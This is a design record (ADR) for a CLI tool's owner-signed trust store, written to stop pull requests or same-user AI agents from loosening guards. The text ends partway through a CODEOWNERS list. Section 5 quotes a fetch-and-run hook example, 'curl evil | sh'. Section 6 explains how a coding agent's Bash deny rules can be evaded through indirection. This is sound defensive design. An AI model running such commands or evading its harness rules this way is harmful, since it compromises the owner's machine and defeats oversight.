---
type: ADR
id: "0025"
title: "Trust anchors live in an owner-controlled per-machine trust store; repo files can only tighten"
status: proposed
date: 2026-10-29
---

> Owner acceptance: direction approved 2026-10-30 (tasks T0.10, T0.15); text including the 2026-11-01 amendments accepted 2026-11-02; Amendment 2026-11-02 (task T0.29) accepted 2026-11-06 with its recommended defaults. The status is `proposed` and stays so until the decision is implemented (`docs/adr/README.md` reserves `accepted` for that); T1.0 is implementing it in chunks.
>
> Owner decision 2026-11-02 (section 3, "Owner decision"): the rows marked "no" (`env`, `profile`, `system1`, `resolver`, `session-dir`) are also signed with the owner key, and the guarded-command rule ships with `trust init` asking for env classes, so every command except `--help` and `trust init` needs a store from then on.
>
> Implementation note (T1.0, 2026-11-02), a deviation from section 1, **accepted by the owner on 2026-11-06**: the CLI's
> injectable entry `runCli(argv, deps)` is compiled into `dist/main.js`, though not in the package `exports`;
> only `TrustStore.open(dir)` and the test store helpers sit in a test-only module (`packages/core/test/support.ts`,
> alias `@flowctl/core-testing`) that is never built. Reaching `runCli` needs a deep import of
> `dist` and a `TrustStore`, which itself needs a deep import into core's `dist`: within the same-user limit of
> section 6. The build test that lists emitted files and fails on a test module is still open.

## Context

ADR 0021 already solved one case of this problem: whether a flow's shell hooks may run is decided by a
store on the machine, outside the repository, so a pull request cannot bring its own consent.

The drafts of ADRs 0020, 0022 and 0024 repeated the mistake in other places. Each check compared a value
against data that the actor under suspicion can edit (a pull request, an agent with write access to the
repo) or against a process that runs in the same place as the generator: the production origin list, the
login origin, the env allowlist, the System 1 endpoint, the destructive-confirm answer, the baseline key.
A guard that lives in a file the attacker can change is a suggestion.

**Criterion, stated honestly.** A pull request, or a script supplied by the repository, cannot loosen any
guard, redirect any credential or forge any approval, **assuming the agent cannot execute arbitrary commands
as the owner outside the harness**. Against a same-user agent with an arbitrary shell, the mechanisms below
raise the cost and leave evidence; they do not prevent. Section 6 lists exactly what is enforced against
that adversary. The design does not depend on listing bad patterns; it depends on where the trusted values
live and which key signs them.

## Decision

**Every value that grants power lives in a per-machine trust store owned by the human who runs flowctl.
Repository files (`flowctl.config.yaml`, flows, specs, `.flows/`) can only narrow what the store allows.
A missing store entry means refuse, never a default.**

### 1. Location, permissions, identity

- **Where.** The directory is `<passwd home>/.config/flowctl`, where the home directory comes from the
  passwd entry: the libc call `getpwuid_r(geteuid())`, which `os.userInfo().homedir` wraps; the
  environment is not consulted. **There is no compiled default and no fallback**: a process with
  no passwd entry (a container with a random uid) is refused, and `$HOME`, `os.homedir()`, `$XDG_CONFIG_HOME`
  and `$FLOWCTL_TRUST_DIR` (or `$FLOWCTL_TRUST_FILE`) are **never consulted in any mode** (interactive,
  non-interactive, CI, tests, MCP), and no command-line flag and no config key selects the store. Under `sudo` the home is root's, so the
  store is root's and a run as root finds none of the user's entries and fails closed; this is documented.
- **Override.** A different directory is accepted **only when it carries a marker file** that
  `flowctl trust init` created and registered under the default store (`flowctl trust init --allow-dir
  <path>`; `--allow-dir` exists on `trust init` only). **A bare flag is never enough**, because a repository
  script can pass any flag. This is how a CI runner or a second disk is declared. Selection is by the
  default store alone: a run always opens the default directory first and follows a `redirect` record in
  it (written by `trust init --allow-dir`, covered by the owner signature of section 3) to the registered
  directory, whose marker must name the default store's fingerprint. A run therefore finds the same store
  whatever its environment, arguments or working directory. *Test:* set each of `$HOME`,
  `$XDG_CONFIG_HOME`, `$FLOWCTL_TRUST_DIR`, `$FLOWCTL_TRUST_FILE` and pass `--trust-dir <x>` to a guarded
  command; the resolved store path is unchanged and the flag is a usage error. Failure mode: a marker that
  names another fingerprint, or an unsigned `redirect`, ends `trust_tampered`.
- **Test store.** The test suite does not use a `ci`-marked store (a `ci` marker is a production
  concept, and tests would have to set it to run their fixture hooks). It builds a **separate store in a temporary directory** with a `test` marker and
  opens it through an in-process argument of the internal `TrustStore.open(dir)`, which is not exported
  from `packages/core/src/index.ts` and not in the `exports` map; the CLI never forwards a directory, so
  CLI tests call `main(argv, deps)` in-process with the store injected (T1.0 owns that seam). **The
  `main(argv, deps)` seam, and `TrustStore.open(dir)`, are exported only from a test-only module that is absent
  from the published build** (not in `exports`, not compiled into `dist`; a build test lists the emitted files
  and fails if the module appears). A `test` store accepts only entries whose origins are loopback and whose
  class is `local`, has no `system1` host other than the localhost fake, and is refused outside the process
  that created it (it records its creator pid and is deleted on exit). **It accepts hook digests only for
  files under `packages/*/test/fixtures`** (the closure `flowsRoot` must resolve there). Even if a repository
  script could select one, it grants nothing beyond loopback and fixture hooks.
  *Test:* adding a non-loopback origin or class `production` to a `test` store fails; a hook digest for a file
  outside `packages/*/test/fixtures` is refused by a `test` store.
- **Permissions.** The directory is created 0700. `trust.json` is created with the mode set at creation,
  `open(path, O_WRONLY | O_CREAT | O_EXCL | O_NOFOLLOW, 0o600)`, not chmod-ed afterwards. Updates take an
  advisory lock, write a temp file the same way in the same directory and rename it atomically.
- **On every read** flowctl `fstat`s the opened file and refuses it if it is a symlink, has a link count
  above 1 (refusing a hard link is intended: a second name for the file could sit in a place the owner does
  not guard) or is writable by anyone but its owner. The owner must be the current user, **or** (for a CI
  layout) root or another distinct uid, with the store **not writable by the current user**; PR code running
  as the job user can still write a store the job user owns, so **CI must use a read-only provisioned store**.
  The directory gets the same check. **A store marked `ci` must be owned by a uid other than the current
  euid and not writable by the current euid** (checked with `fstat` mode and owner on the directory and
  files, on every read); otherwise every guarded action ends `store_writable_in_ci`. *(Superseded in part by
  Amendment 2026-11-02, sections 2 and 3: this rule is the `uid` layout; the checks go beyond mode bits; a
  `signed` layout exists for runners where it cannot hold.)* Mutating `trust`
  subcommands (`add`, `link`, `hook`, `key`, `ci`, `export`, `forget`, `revoke`, `init --replace`) **refuse
  on a `ci` store**: it is provisioned elsewhere (`verify-bundle` and the guarded commands do not mutate it).
- **Not inside any repository.** The store directory must not be inside, or tracked by, **any** enclosing
  repository, not only the current one: compared by `realpath` including mount points, any ancestor
  holding a `.git` entry refuses it. There is no exemption for a home directory that is itself a repo
  (a dotfiles repo): that layout is refused, and the owner chooses another location through the marker.
- **Windows.** POSIX modes are not enforced there. Guarded actions are **refused** when the permissions of
  the store cannot be verified, and on Windows in general: the failure is `platform_unsupported`. There is no "warn and
  continue".
- **Names** used as keys (env, profile, project) pass `NAME_PATTERN` before any path is built from them.
- **Project identity.** An entry applies to a checkout identified by its `realpath` **and** its repository
  identity: the sorted set of **root commit hashes** (`git rev-list --max-parents=0 --all`, run with
  `GIT_NO_REPLACE_OBJECTS=1`), recorded at `init`. **The git calls for identity run with a scrubbed
  environment**: only `PATH` (the fixed list of ADR 0021 amendment 2.9), `HOME` from the passwd entry,
  `GIT_NO_REPLACE_OBJECTS=1` and `GIT_CONFIG_NOSYSTEM=1`; `--git-dir` is set to the realpath of the discovered
  `.git`; and identity is refused (`identity_unverifiable`) if `objects/info/alternates` exists. No `GIT_*`
  variable of the parent, no `core.*` config of the repository other than what that git-dir implies, and no
  hook is consulted. **The remote URL is never used**: `git remote set-url` is
  a one-line edit by anything that can run git. An entry matches when its recorded set is non-empty and a
  subset of the checkout's current set (a merge that adds a root does not break trust; another history
  shares no root and does not match). `flowctl trust link` run from a worktree compares the identity with
  the entry and refuses a mismatch, so a copied directory with another history does not inherit trust. The
  identity is **not computable, and every guarded action ends `identity_unverifiable`**, when the
  repository is shallow (`git rev-parse --is-shallow-repository` prints `true`: the boundary commit would
  stand in for a root), has no commit, has `.git/info/grafts`, or has any ref under `refs/replace/`. CI
  must therefore check out full history (`fetch-depth: 0`). A mismatch ends `project_not_trusted`.
  **This identity is a copy detector, not authentication:** anyone who clones the repository shares its root
  commits, so a match proves only that the checkout descends from the repository the owner trusted, never
  that its content is trusted. The trust itself is the owner's `trust init` entry. *Test:* a clone with a
  different remote URL still matches; a `--depth 1` clone, a grafted repository, a repository with a replace
  ref and a repository with `objects/info/alternates` are refused; `GIT_DIR` and `GIT_ALTERNATE_OBJECT_DIRECTORIES`
  set in the parent change nothing.

### 2. What it holds

| Section | Content | How the repo may use it |
|---|---|---|
| `projects` | Per project: root and identity (above); `defaultEnv`; `language` and `locale` (the per-project defaults ADR 0020 section d uses for spec language and number parsing) | A checkout not listed has no entries, so every guarded action is refused. `defaultEnv` is typed by the owner at `init`, is never a `production` env, and is changed only by the owner-signed `trust add default-env`; a repo `defaultEnv` that differs is ignored with a warning (ADR 0024 section 1) |
| `envs` | Per env: exact origin, `class` (`production`, `shared`, `local`), `visitOrigins`, `callOrigins` | A repo env is honoured only if name, origin and class match the store; the repo `scope` can only intersect the two origin sets. **Every `callOrigins` entry of a `production` env is automatically a production origin** and is guarded as one (it needs its own `allowReadOnlyReplay` entry to be used) |
| `productionOrigins` | Exact origins of production, typed by the owner at `trust init` (section 3) | Checked on **every redirect hop and every request**; no repo value can relabel such an origin lower |
| `productionOrigins[<origin>].allowReadOnlyReplay` | Optional, per production origin, **the one schema** (grammar owned by ADR 0024 section 2a): `{ profiles: string[], sessions: { <profile>: <file name under sessionDir> }, templates: [{ class, path, query, headers? }], assetPaths: string[], assetQuery: string[], sessionMaxAge, expires }`. `class` is one of `document`, `xhr`, `eventsource`, `graphql`. A production entry covers every scheme and port of its host (ADR 0024 section 2a) | Absent means replay on that origin is refused (the default). **The repo cannot add or change any field**; it can only narrow by choosing a profile or flow that is already allowed. Written only by `flowctl trust add readonly-replay <env>`, which prints the full entry, needs the nonce and an **owner-key signature** (it grants a read path on production). A session's age is judged by the `createdAt` written inside the session file, not by its mtime. The entry is valid until `min(session createdAt + sessionMaxAge, expires)`; past that it is treated as absent and the failure is `readonly_replay_not_trusted` (`profile_expired` for the session) |
| `profiles` | Per profile: trusted login origins, and `envVars`, the list of environment variables its secrets and env inputs may use, each as `{ name, kind }` with `kind` `secret` or `username` (the **per-profile and per-project** allowlist, issue #41; the kind is bound here and never in a flow) | Credentials are typed only on a trusted origin, checked at fill time after every redirect hop |
| `system1` | Allowed `apiKeyEnv` names; allowed endpoints and `allowedHosts` as exact host plus port; `allowedEnvs`; the cost price table | The repo's `allowedEnvs` can only remove entries; its `baseUrl` must be inside `allowedHosts`; the repo may only **raise** a price |
| `destructiveConfirm` | Entries of kind `create`, `mutate` or `session`, each with `origin` and an `expires` of at most 90 days; revoked with `trust forget`/`trust revoke`; the schema block is defined in ADR 0024 section 5 and not repeated here. An entry whose env class is `production` is invalid (`trust_entry_invalid`) | An action not matching an entry cannot be confirmed by repo data |
| `reviewerKeys` | Ed25519 public keys with: person, `scope` (`flows` or `spec`), expiry, and a revocation list | Verifiers hold only public keys; a revoked or expired key's approvals fail; a `spec`-scope key cannot sign a case approval and a `flows`-scope key cannot sign spec metadata |
| `flowFloors` | Per (project, flow name): the minimum approval revision (ADR 0020 section f) | A record below the floor does not verify; set by owner-signed `trust add floor <flow> <n>` |
| `specFloors` | Per `provider/ref`: the minimum revision of signed spec metadata (ADR 0020 section i.2) | Signed metadata below the floor reads as unsigned |
| `latestRevision` | Per (project, flow name): the highest approval revision seen on this machine | Written only by the interactive approval command (ADR 0020 section f), never by a replay |
| `handWritten` | Files the owner classed as hand-written (ADR 0020): path plus **closure digest** (ADR 0021 amendment; the flow file plus the files its hooks call), recorded only for content the owner was shown (section 3). A flow with an `uncovered` hook cannot be classed | A flow whose closure digest differs is `unclassified` |
| `classification` | `enforce` or absent; set by owner-signed `flowctl trust ci --enforce-classification` (T4.16 prints that command at the end of its batch) | When `enforce`, a run that executed an `unclassified` flow exits non-zero (see the `ci` row) |
| `resolvers` | Pinned **absolute** binary path, not writable by others and not under any repository or worktree, plus vault or item allowlist | A reference outside the allowlist is refused |
| `roots` | A list of `{ purpose, path, name?, identity? }` with `purpose` one of `flows`, `contracts`, `specs`, `repos`, `issues`. `path` is an absolute realpath. For `flows`, `identity` is the root-commit set of the repository that holds it (rule of section 1) and `name` is the key a repo's `flowsDir` may use (ADR 0024 section 1a). Issue hosts and token scope live under `issues` | **The purpose is enforced**: a provider reads only from roots of its own purpose (ADR 0023); a `contracts` root is never accepted as a flows root. `trust add root` refuses the passwd home, any ancestor of it, and any directory that contains a credential directory (`.ssh`, `.aws`, `.gnupg`, `.kube`, `.docker`, `.config/flowctl`, the owner-key directory, a registered `sessionDir`). A `flows` root whose identity no longer matches ends `root_not_trusted`. `trust init` registers the flows directory of the project (the owner confirms its realpath) as a `flows` root, so ADR 0021 and ADR 0024 always find the flows root in the store and never in repo config |
| `sessionDir` | Where saved sessions live (default `<store>/sessions`) | Never inside the repo |
| `hooks` | Hook consent (ADR 0021): per project and flow, the digest, the `env` names and the `uncovered` list recorded when the owner consented. Written only with an owner-key signature (section 3) | Honoured only on an exact digest match, recomputed before each hook runs; see section 5 |
| `ci` | A marker that this store was provisioned for a CI runner | **Grants no consent and loosens no guard; it only tightens.** It declares the layout of section 1 (store owned by another uid, not writable by the job user, else `store_writable_in_ci`; *superseded in part by Amendment 2026-11-02 section 2: the marker carries `layout` `uid` or `signed`*), makes the store **ignore** hook entries that have an `uncovered` list (ADR 0021 amendment section 1), and sets the exit rule: **a run that executed an `unverified` flow exits non-zero** (`provenance_unverified`, ADR 0020 section h), and so does a run that executed an `unclassified` flow (`provenance_unclassified`) when the store carries `classification: enforce`; the `ci` marker also sets `--require-provenance`. Set by `flowctl trust ci` (the owner-machine path, which asks for a distinct typed phrase) or written into the exported copy by `trust export --for-ci`; never set by a runner. Consentability is decided by this marker alone, never by whether the process is interactive |
| `test` | A marker for the temporary store of the test suite | Loopback origins and class `local` only; see section 1 |

### 3. How entries are added

- Only `flowctl trust ...`, run interactively by the owner on that machine. It prints the full entry (and
  for a change the diff) and asks for a nonce printed **only on `/dev/tty`** and typed back. It refuses when
  stdin or stdout is not a TTY. It is not an MCP tool and not reachable through any non-interactive path.
- **Command dispatch.** Subcommands are `init`, `add`, `link`, `hook`, `key`, `ci`, `export`, `verify-bundle`,
  `forget`, `revoke` (*extended by Amendment 2026-11-02*). Hook consent is
  `flowctl trust hook <name...>`; every hint flowctl prints emits only that form. The old `flowctl trust
  <name...>` alias is **removed**. A flow whose name equals a reserved subcommand (`init`, `add`, `link`,
  `hook`, `key`, `ci`, `export`, `verify-bundle`, `forget`, `revoke`) is refused at flow load, so no name is ambiguous. T1.0 owns the command registry.
- **Integrity.** Every change is appended to `trust.log`, a **hash chain**: each line carries the hash of the
  previous line. The chain head is also stored in a second location, and **that location is recorded at
  `init` and enforced**: unsetting the keychain environment, or removing the second head, does not
  downgrade the check, it ends `trust_tampered`. *(Carve-out: a store marked `ci` has no second location; its
  second head is the signed manifest and the per-run pin. The location, and the host without a keychain, are
  specified in Amendment 2026-11-02 section 7.)* `trust.json` carries the head it was written with. Changes
  to `reviewerKeys`, `handWritten`, `redirect`, `allowReadOnlyReplay`, `destructiveConfirm`, `flowFloors`,
  `roots`, `productionOrigins`, `hooks` and `projects.defaultEnv` (and, for completeness, `specFloors`,
  `classification` and `latestRevision`'s reset) additionally require a signature by an **owner key**
  created at `init` (Ed25519, passphrase-protected, mode 0400, in its own directory; *"or hardware-backed" is
  superseded: custody is specified in Amendment 2026-11-02 section 5 and only the passphrase file exists*),
  **verified against the public key pinned at `init`** on every read, not only at write time: an unsigned or
  wrongly signed entry of these kinds is ignored and ends `trust_tampered`. The owner
  **public key is pinned by fingerprint at `init`** in the registered location, so replacing both the key
  and the store is detected. The same-user limit of section 6 stays.
- **`trust init` on an existing store refuses**, with one exception: `trust init --allow-dir <path>` (section 1)
  adds a registered directory and a signed `redirect` to the existing default store, and requires the owner-key
  signature. Replacing a store (a lost key, a new machine image) needs
  `trust init --replace`, which requires a signature by the **old** owner key over the new fingerprint; without
  the old key the owner removes the store by hand and every entry is re-entered, which is intended. *(The
  procedure is specified in Amendment 2026-11-02 section 6.)*
- **`trust add` kinds.** Every mutation is interactive (nonce on `/dev/tty`), **with one exception:
  `trust verify-bundle --install`** (Amendment 2026-11-02 section 1), which is non-interactive and installs only
  bytes the owner key already signed; the second column says whether
  it also needs the owner-key signature.

  | Kind | Writes | Owner-key signature |
  |---|---|---|
  | `trust init` | the whole store, classes, production origins, `defaultEnv`, owner key pin | creates the key |
  | `trust add env` / `profile` / `system1` / `resolver` / `session-dir` | `envs`, `profiles`, `system1`, `resolvers`, `sessionDir` | no (nonce only; not in the signed list, see the owner decision below) |
  | `trust add root` | `roots` | yes |
  | `trust add default-env` | `projects.defaultEnv` | yes |
  | `trust add production-origin` | `productionOrigins` | yes |
  | `trust add readonly-replay` | `allowReadOnlyReplay` | yes |
  | `trust add destructive` | `destructiveConfirm` | yes |
  | `trust add floor <flow> <n>` | `flowFloors` | yes |
  | `trust add handwritten` | `handWritten` | yes |
  | `trust hook <name...>` | `hooks` | yes |
  | `trust add hook-path <dir>` | `hooks.pathDirs`, the store-side fixed `PATH` list of ADR 0021 amendment 2.9 (default `/usr/bin:/bin:/usr/sbin:/sbin`) | yes |
  | `trust key new` / `add` / `revoke` | `reviewerKeys` | yes |
  | `trust ci`, `trust ci --enforce-classification`, `trust ci --off` | `ci`, `classification` | yes |
  | `trust add project` | a `projects` entry (root, identity), also used for a second checkout | yes |
  | `trust add language`, `trust add locale` | `projects.language`, `projects.locale` | yes |
  | `trust add spec-floor <provider/ref> <n>` | `specFloors` | yes |
  | `trust add redirect` | the `redirect` record to a registered store directory (section 1) | yes |
  | `trust forget <kind> <id>` | removes one entry of any kind above; `trust revoke destructive <id>` is `trust forget destructiveConfirm <id>` | yes |
  | `trust link` | `projects` (adds a worktree path) | no (identity must match, section 1) |
  | `trust export --for-ci <dir>` | a bundle directory (Amendment 2026-11-02 section 1) and one `export` line in the source `trust.log` | yes (signs the manifest and the entries it rewrites) |
  | `trust key rotate-owner` | the owner key and every signed entry's signature (Amendment 2026-11-02 section 5) | yes (old and new key) |

  On a store marked `ci` every row refuses (see section 1), including `trust ci --off`, `trust export`,
  `trust forget`, `trust revoke` and `trust init --replace`. **A CI store is
  provisioned on another machine or account**: the owner builds it with the rows above and copies it
  (`flowctl trust export --for-ci <dir>`, specified in Amendment 2026-11-02 section 1; "or by hand" is
  **superseded**: a hand copy has no signed manifest and a runner refuses it); the export writes the `ci`
  marker into the copy. Project entries and hook entries are bound to the **realpath** of the checkout and the flows root as
  recorded, so a runner must check out at the path the entries name (Amendment 2026-11-02 section 1, "Runner roots", says how
  the export declares those paths). **Owner decision:** also sign the rows marked
  "no" (`env`, `profile`, `system1`, `resolver`, `session-dir`), because an `envs` class or a `system1` host
  also grants power. Recommended default: yes, sign them (one more passphrase prompt per change). *Decided
  2026-11-02: yes, they are signed.*
- **Key provisioning.** `flowctl trust key new|add|revoke` creates or registers a reviewer key. It refuses
  a key path inside any repository, and requires a passphrase or a hardware-backed key (a hardware-backed key is
  kept for **reviewer keys only**; the owner key is the passphrase file of Amendment 2026-11-02 section 5).
- **CI** uses a store provisioned before the job (runner image or secret mount), owned by root or a distinct
  uid and read-only to the job user, declared by `trust init --allow-dir` and marked `ci` *(this is the `uid`
  layout; a runner that cannot provide it uses the `signed` layout, Amendment 2026-11-02 section 2)*. **Hook consent in
  CI is by pre-provisioned digest only** (section 5): the owner runs `flowctl trust hook <name>` on the
  provisioning machine, which records the digest of the hooks and of the files they call, and ships the
  store; a pull request that adds or edits a hook, or a file a hook calls, changes the digest and the run
  ends `hooks_untrusted`. In CI the owner
  key is a **pre-provisioned public key only**; the passphrase-protected owner key is for interactive use. A
  workflow file in the repository can pass a different directory, but without a marker it is refused. CI is
  only as safe as the protection of the workflow files: branch protection (issue #44) and CODEOWNERS on
  `.github/` are **preconditions**, listed in T0.14 and T7.6.
- **First use.** `flowctl trust init` reads the repo's `flowctl.config.yaml` and shows each env, origin and
  name as **candidates only**. For every env the owner **types the `class`** (`production`, `shared` or
  `local`); there is no default and Enter does not accept. The owner is also asked **separately for
  `productionOrigins`**: the repo's origins are listed, and an origin becomes production only when the owner
  types it back. Neither value is ever copied from the repo file or inferred from a name such as `prod`. An
  owner also types the project's `defaultEnv` (never a `production` env; no default offered) and its
  `language` and `locale`. An
  env whose class was not answered is not written, so it later ends `env_not_trusted`; an origin used by two
  envs with different classes is refused. *Test:* with a repo config that labels its production URL `local`,
  `init` (driven through a pty) writes the answer typed by the owner, and a run against that origin is
  blocked as production.
- **Guarded commands.** A command is guarded unless the command registry (T1.0) marks it `guarded: false`;
  **the default for a new command is guarded**, and a registry test fails if a command lacks the flag.
  Unguarded are only commands that run no browser, no shell and no network call and write no flow, session
  or report: it **writes only the store**. The unguarded commands are exactly `--help`, `--version` and
  `trust init` (which refuses on an existing store, above) *(plus `trust verify-bundle`; the exact list in
  Amendment 2026-11-02 section 1 supersedes this one)*. **Every MCP tool is guarded**, with no exception
  (an MCP tool that reads a flow, lists flows or reports a run included). Guarded (they end `trust_missing`
  before any side effect when the store, the project entry or the needed entry is missing): `replay` (with
  or without `--heal`), `login` (manual and `--auto`), `save`, `check`, `explore`, `cleanup`, `crawl`,
  `derive`, `target check`, every MCP tool, and every `trust` subcommand except `init` and `verify-bundle` (they need an
  existing store). *Test:* the registry test pins the unguarded list **exactly** (`--help`, `--version`, `trust
  init`, `trust verify-bundle`) and fails on any addition or removal; run each registered command with no store: each guarded
  command exits with `trust_missing` and has touched no file.
- **Display rules for every owner confirmation screen** (this batch screen, `trust hook`, `trust add
  destructive`, `trust add readonly-replay`): **paging is built in and `$PAGER` is never used**. Every code
  point in the categories `Cc`, `Cf`, `Co`, `Cn` and every `Zs` other than U+0020 is shown escaped as
  `\u{XXXX}` (so a bidi override, a zero-width character or a no-break space cannot hide); an origin that
  contains non-ASCII characters is shown in punycode next to its Unicode form; each file is shown with its
  byte length; a file over **256 KiB**, or one that is not UTF-8 text, is refused (not shown, not
  confirmable).
- **Batch classification of `handWritten` flows** (T4.16). The command lists the unclassified flows and
  **displays, for every file, its full content** under the display rules above, together with its path and
  its **closure digest** (ADR 0021 amendment: the flow plus the files its hooks call, each shown in full). Each
  flow needs its own typed nonce after it was displayed. There is **no "confirm all"** and no way to confirm a
  path that was not displayed in this session. **The recorded key is the closure digest, not the file hash**,
  computed from the bytes held in memory when they were displayed; the closure is recomputed before the write
  and a flow that changed is skipped. **A flow with an `uncovered` hook cannot be classed** (it is listed
  with the reason and skipped). The change is signed with the owner key like any other `handWritten` change.
  *Test:* a driver that sends N confirmations while N-1 files were displayed records N-1 entries; a flow
  edited between display and confirmation is not recorded; a flow whose hook calls a script edited after
  classification is `unclassified`; a flow with a hook that runs `python3 -c x` is listed and not recordable.

### 4. The env allowlist (issue #41)

The owner decided on 2026-10-30 (T0.12) that flows keep `inputs: { env: NAME }` (Option A). **The allowlist
lives in the trust store, per profile and per project, and each user maintains it on their own machine**
with `flowctl trust add`; it holds names and kinds, never values. On a CI runner, whoever owns the runner
provisions it (section 3). Matching is case-insensitive on the whole name; a bare
`*` is forbidden; these patterns are excluded unless the entry names the variable in full: `*SECRET*`,
`*TOKEN*`, `*KEY*`, `*PASSWORD*`, `*PASS*`, `*PWD*`, `*CREDENTIAL*`, `*AUTH*`, `*DSN*`, `*URL*`. Every env
input is redacted in previews, `decisions.jsonl` and evidence. The field it may be typed into is decided
by role (ADR 0024 section 4). Option B (removing the input kind) was rejected; see ADR 0024 section 7.

### 5. Hook consent moves into the store (amends ADR 0021)

- Hook consent is folded into `trust.json` under `hooks`, under the same checks: owner, mode set at
  creation, `O_EXCL` and `O_NOFOLLOW`, `fstat`, not inside any repo. Each `hooks` entry is written with an
  owner-key signature and verified against the pinned public key (section 3).
- **`$FLOWCTL_TRUST_FILE` is never read** (it is not an alternative location, section 1). **Migration does
  not import digests.** The old `trusted-hooks.json` is read, if at all, only from the fixed path under the
  passwd home, and only to tell the owner which flows need consent again; every hook needs
  `flowctl trust hook <name>`, which shows the hook text and every closure file, before it runs.
- **There is no blanket consent in any mode.** `--trust-hooks`, `FLOWCTL_TRUST_HOOKS=1` and
  `trustHooks: true` are **removed**, including for a store marked `ci` and for the test suite (which
  pre-consents its fixture hooks in its `test` store with the same digest entries). A workflow file or
  repository script can set a flag, a variable or an argument, so honouring any of them in a `ci` store let a
  pull request add `setup: curl evil | sh` without touching the workflow. The three names are still parsed
  for one release and ignored with a warning that names this section. The one non-interactive path is a
  **digest already in the store**: a hook runs when the entry for (project, flow) holds the digest of the
  current hook text and closure ([ADR 0021](0021-hook-consent.md) amendment, section 2, where the closure is
  defined once), recomputed before each hook starts.
- **Reasons on `hooks_untrusted` and `hook_env_unsafe`.** The hint names the flow and exactly one reason:
  `no_entry`, `digest_mismatch`, `hook_uncovered` (the closure has `uncovered` entries and the store is
  marked `ci`), `hook_env_unsafe` (a `PATH` entry or an env name fails the checks of the ADR 0021 amendment
  2.9, or the hook snapshot cannot be made; it is a reason of `hooks_untrusted`, not a separate error). It never suggests a flag.
- **Consentability is decided by the store marker only.** A store marked `ci` ignores any entry with a
  non-empty `uncovered` list; any other store honours it, interactive run or not, because the owner saw the
  list when consenting. This is the same rule as the `ci` row of section 2 and ADR 0021 amendment section 1.
- **Exploration requests that carry hooks** are refused `hooks_untrusted` (`no_entry`) until the flow is saved
  and `flowctl trust hook <name>` has been run; the confirming replay of `saveExploration` therefore never runs
  a hook the owner has not seen.
- *Test:* in a `ci` store, run with the flag and the variable set and with a hook edited by one character:
  `hooks_untrusted`; run with the provisioned digest: the hook runs; edit a script the hook calls:
  `hooks_untrusted`; a hook with an `uncovered` list in a `ci` store: `hooks_untrusted` (`hook_uncovered`), and
  in a non-`ci` store: runs.
- **Alternatives considered.** Refuse the flag and keep no CI path: CI could not run hook flows and people
  would hide the flag in a wrapper. Require the flows directory to be a pinned commit: the pin would sit in
  the workflow or the config, both editable by the pull request, so it needs a store entry anyway, and then
  the digest does the same job more finely. Pre-provisioned digests were chosen because the owner of the
  runner decides, outside the pull request, exactly which bytes may run; the cost is one `trust hook` and a
  re-provisioning per hook edit.
- **Owner decision:** whether a CI store may also carry one `hooks` entry per flows directory (a signed
  tree hash: fewer re-provisionings, larger blast radius). Recommended default: no, one entry per flow.

### 6. What is and is not enforced

- **Enforced against a pull request or repo script:** the store, its marker directories and the owner key
  are outside the checkout; guards narrow only; the store pointer cannot be redirected by environment or by a
  flag without a registered marker; an approval needs a key the generator does not hold; the store mutations
  of section 3 need the owner-key signature.
- **Detected, not prevented, against a same-user agent with an arbitrary shell:** edits to `trust.json` and
  `trust.log` (hash chain, second head, owner signature for the signed kinds). Such an agent
  could also read a nonce shown on a pseudo-terminal it owns, so a TTY is friction, not proof of a human.
  Remaining defences are the harness (below) and the guard-bash hook, which is **specific to Claude Code**;
  other agents need their own equivalent. An attacker with full control of the owner's account is out of
  scope.
- **Residual risk named: PR code earlier in the same CI job.** A job that runs a pull request's code (tests,
  a build script, a package install hook) before it runs `flowctl` has a same-user adversary inside the job:
  that code can write anywhere the job user can write, set the environment of later steps and plant files a hook
  will meet. The read-only `ci` store (section 1) keeps it from changing the store; it does not stop it from
  changing what a covered hook runs against (data it reads, a service it calls). **Hook code is same-user
  code**: a consented hook has the privileges of the job user, and the digest is not a sandbox (ADR 0021
  amendment, section 4). The hook snapshot closes swaps by other uids only, and a hook never runs unsnapshotted (ADR 0021 amendment
  2.7); it does not stop a same-user writer. The mitigation is ordering and isolation, not a flowctl check: run flowctl in a job or
  container that has not executed PR code, with the checkout mounted read-only where possible.
- **Where the harness deny rules are anchored.** The in-repo `.claude/settings.json` (and
  `.claude/settings.local.json`) can be edited by a pull request or by an agent with repo write access, so
  deny rules that live there are a convenience and **not the anchor**. A pull request can set at least these
  project-settings keys: `env`, `hooks`, `statusLine`, `apiKeyHelper` (each can run code or inject
  environment on the owner's machine) and `permissions.defaultMode` (it can relax prompts), plus
  `permissions.allow`; none of them is relied on, and `/.claude/` is under CODEOWNERS (below).
  **The anchor is managed settings outside the repo** (at the time of writing
  `/Library/Application Support/ClaudeCode/managed-settings.json` on macOS and
  `/etc/claude-code/managed-settings.json` on Linux; T0.17 verifies the paths). **User-level settings
  (`~/.claude/settings.json`) count as an anchor only if** the rules in them also deny Edit, Write and Bash
  writes to the user settings file itself **and** `CLAUDE_CONFIG_DIR` is unset in the environment `init` sees
  (a set value moves the user settings file to a place the rules do not name). When only user-level rules
  exist, `init` reports the distinct reason `harness_deny_user_only` instead of treating them as satisfied. The
  required rules deny Edit and Write on the store directory, the owner-key directory and `sessionDir`, Read on
  the last two, and Bash commands or redirects that name any of the three. **Bash deny rules are friction, not
  a control:** they match command text, and variable indirection, an interpreter or a `cd` followed by a
  relative path defeats them; the Edit, Write and Read rules act on the tool call and are sturdier, and none of
  them stops a process the agent starts through another route. **The project file may only add rules**: it
  holds extra denies, and no `allow` in it is relied on to override a deny from managed or user scope (T0.17
  confirms against the harness that a deny in any scope wins). `flowctl trust init` reads the out-of-repo
  files and prints one line per required rule that is missing (`harness_deny_missing`); it cannot know which
  agent runs later, so this is a **warning, not a gate**. *Test:* `init` against fixture settings files
  reports exactly the missing rules, counts a rule found only in the project file as missing, reports
  `harness_deny_user_only` for user-level rules alone and for user-level rules with `CLAUDE_CONFIG_DIR` set.
  **Owner decision:** whether guarded commands should also refuse to start inside a detected Claude Code
  session without the rules. Recommended default: no, warn only, because detection is environment-based and
  an attacker controls the environment.
- **Stop-gaps a pull request can edit.** `scripts/check-arch.mjs` (T0.13) and the in-repo guard-bash hook
  live in the repository and are tripwires only; their protection is CODEOWNERS and review.
- **Proposed CODEOWNERS paths** (carried into the T0.14 row of `docs/roadmap/tasks.md`): `/.claude/`,
  `/.githooks/`, `/.husky/`, `/.github/` (including `CODEOWNERS` itself), `/scripts/`, `/docs/adr/`,
  `/Dockerfile*`, `/packages/*/Dockerfile*`, `/package.json`, `/packages/*/package.json`, `/bun.lock`,
